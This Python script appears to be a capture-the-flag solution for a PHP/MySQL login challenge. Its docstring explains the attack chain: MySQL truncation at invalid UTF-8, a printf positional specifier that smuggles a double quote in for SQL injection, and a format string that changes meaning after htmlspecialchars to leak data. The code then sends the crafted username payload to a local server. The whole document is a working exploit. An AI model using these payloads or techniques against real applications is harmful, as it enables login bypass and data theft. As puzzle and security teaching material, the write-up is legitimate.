import requests

r"""
Idea 1: UTF-8 truncation. MySQL will truncate anything after invalid UTF8,
so 'admin' and 'admin%FFsome garbage' are treated as the same thing.

Idea 2: We can inject a positional specifier %1$c. We then choose a password
such that sha1(password) numerically coerces to 34, the ascii value for
a double quote. This allows us to smuggle a double quote in and do
SQL injection.

Idea 3: We are now faced with a challenge. We can't have $username == 'admin',
that's impossible, and even if we leaked the hash it would be no good since we
can't brute force it. So we are forced to take the second branch, with
"Hello $htmlsafe_username, the server time is %s". Notice we can smuggle more
printf parameters, but if we naively do something like %2$s we will cause an
error in the previous format string, which is only supplied a single parameter.

The question then becomes, it is possible to construct a format string that that
is different when htmlspecialchars is applied? Yes it is! The trick is to realise
escaped percent chars ('%%') can also take formatting arguments. The solution I
came up with is:

%1$'>%2$s

This can be interpreted two different ways. Before encoding:
%1$'>%2$s
\----/\-/
 |     |
 |     |
 |     \-------- raw text '2$s'
 \-------------- a raw '%', taking from position 1, using < as padding char

After encoding:
%1$'&gt;%2$s
\----/\/\--/
 |     |  |
 |     |  |
 |     |  \----- string taken from 2nd position (our leak!)
 |     \-------- raw text 't;'
 \-------------- a floating point number, taking from position 1, using & as padding char
"""
data = {
	'username': b"admin\xff%1$c||1#%1$'>%2$s",
	'password': '668'
}

r = requests.post('http://localhost:5000/', data=data)
print(r.content)